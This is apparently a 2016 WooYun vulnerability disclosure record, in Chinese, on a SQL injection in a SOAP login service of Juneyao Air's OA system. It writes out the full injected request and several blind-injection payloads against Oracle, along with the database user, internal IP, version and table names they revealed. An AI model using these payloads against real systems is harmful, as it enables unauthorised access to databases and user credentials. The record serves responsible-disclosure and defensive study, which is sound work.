{"id": 88632, "wybug_id": "wooyun-2016-0213615", "wybug_title": "航空安全之吉祥航空某系统web service注入漏洞                                      ", "wybug_corp": "juneyaoair.com", "wybug_author": "harbour_bin", "wybug_date": "2016-05-27 23:09", "wybug_open_date": "2016-07-14 08:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-06-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-14：\t细节向公众公开  简要描述： RT 详细说明：  #1 http://oa.juneyaoair.com//services/\n\n#2 注入位置\nPOST http://oa.juneyaoair.com//services/MobileService HTTP/1.0SOAPAction: \"\"Content-Type: text/xml<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\"  xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\"  xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\"  xmlns:m0=\"http://tempuri.org/\"  xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\">     <SOAP-ENV:Header/>     <SOAP-ENV:Body>        <checkUserLogin xmlns=\"webservices.services.weaver.com.cn\">           <in0>1' or '1'='1</in0>           <in1>1</in1>           <in2>1</in2>        </checkUserLogin>     </SOAP-ENV:Body></SOAP-ENV:Envelope>\n1' or '1'='1 结果为51' or '1'='2 结果为4#3 本地通过C#编写代码, 进行中转注入\n\n#4 数据证明POC:\n1' or (select sys_context('userenv','isdba') from dual)='FALSE' and '1'='1 True1' or (select sys_context('userenv','current_user') from dual)='OA' and '1'='1 TRUE1' or (select sys_context('userenv','db_name') from dual)='oanew' and '1'='1 TRUE1' or (select count(distinct(owner)) from sys.all_tables)=9 and '1'='1 TRUE\n\n用户名：OA当前数据库: oanew主机名: OA1-SRV主机IP：172.20.21.41数据库版本: Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production\n数据库\n\nOA数据库共有2008个表POC：\n1' or (select count(*) from sys.all_tables where owner='OA')=2008 and '1'='1\n仅列出部分表\nHPELEMENTSETTING----2016/5/26 14:48:15WORKFLOW_FORWARD----2016/5/26 14:48:18DOCCDANGEWFFIELD----2016/5/26 14:48:20DOCCHANGESETTING----2016/5/26 14:48:27PAGENEWSTEMPLATE----2016/5/26 14:48:28DOCCHANGERECEIVE----2016/5/26 14:48:31WORKTASK_MONITOR----2016/5/26 14:48:32WORKTASKSHARESET----2016/5/26 14:48:32WORKTASK_CODESET----2016/5/26 14:48:36WORKTASK_BACKLOG----2016/5/26 14:48:37WORKTASK_CODESEQ----2016/5/26 14:48:48VORKFLOW_DEPTABBR----2016/5/26 14:48:54WORKTASK_OPERATOR----2016/5/26 14:49:21CPTCAPITALCODESEQ----2016/5/26 14:49:24WORKTASK_TASKLIST----2016/5/26 14:49:25DOCCHANGEWORKFLOW----2016/5/26 14:49:26BILL_BOHAIEVECTION----2016/5/26 14:50:06DOCSUBCATFTPCONFIG----2016/5/26 14:50:10WORKFLOWXFIELDYEAR----2016/5/26 14:50:12WORKTASK_FIELDDICT----2016/5/26 14:50:12DOCSECCATFTPCONFIG----2016/5/26 14:50:18DOCCHANGERECEIVEWF----2016/5/26 14:50:23DOCHANDWRITTENCOLOR----2016/5/26 14:50:41XMLREPORT_SHAREINFO----2016/5/26 14:50:45CPTSEARCHDEFINITION----2016/5/26 14:50:49FAVOURITELASTACTIVE----2016/5/26 14:50:54DOCMAINCATFTPCONFIG----2016/5/26 14:50:57CPTCAPITALEQUIPMENT----2016/5/26 14:50:57DOCCHANGESENDDETAIL----2016/5/26 14:50:57WORKTASK_COD@DETAIL----2016/5/26 14:51:03WORKFLOW_CREATETASK----2016/5/26 14:51:06WORKFLOW_SUBCOMABBR----2016/5/26 14:51:08WORKTASKCREATESHARE----2016/5/26 14:51:08WORKTASK_TASKFIELD----2016/5/26 14:51:18WORKTASK_REQUESTLOG----2016/5/26 14:51:18WORKTASK_SELECTITEM----2016/5/26 14:51:21OFID----2016/5/26 14:51:22WORKFLOW_DEPTABBRDEF----2016/5/26 14:51:31DOCHANDWRITTENDETAIL----2016/5/26 14:51:32OUTERDATAWFSETDETAIL----2016/5/26 14:51:46OUTERDATAWFPERIODSET----2016/5/26 14:51:46OFUSER----2016/5/26 14:51:47WORKFLOW_TRACKDETAIL----2016/5/26 14:51:49WORKTASK_REQUESPBASE----2016/5/26 14:52:11WORKDLOW_SPECIALFIELD----2016/5/26 14:52:56MAILSIGN----2016/5/26 14:52:57OFVCARD----2016/5/26 14:53:02OFGRLUP----2016/5/26 14:53:12HRMORGGROUP----2016/5/26 14:53:36OFROSTER----2016/5/26 14:53:43WORKFLOW_SUBCOMABBRDEF----2016/5/26 14:53:49WORKFLOW_SUPSUBCOMABBR----2016/5/26 14:53:56SYSFAVOURITE_FAVOURITE----2016/5/26 14:53:56PAGENEWSTEMP@ATELAYOUT----2016/5/26 14:54:00WORKFLOW_CODESEQRECORD----2016/5/26 14:54:03OFPRIVATE----2016/5/26 14:54:31...\n跑的太慢了, 不继续跑了, 后续可获得大量数据, OA系统的用户名、密码等...   漏洞证明：  已证明！   修复方案：  没什么用的东西, 就删掉吧   版权声明：转载请注明来源 harbour_bin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-05-30 08:43 厂商回复： 漏洞确认，谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}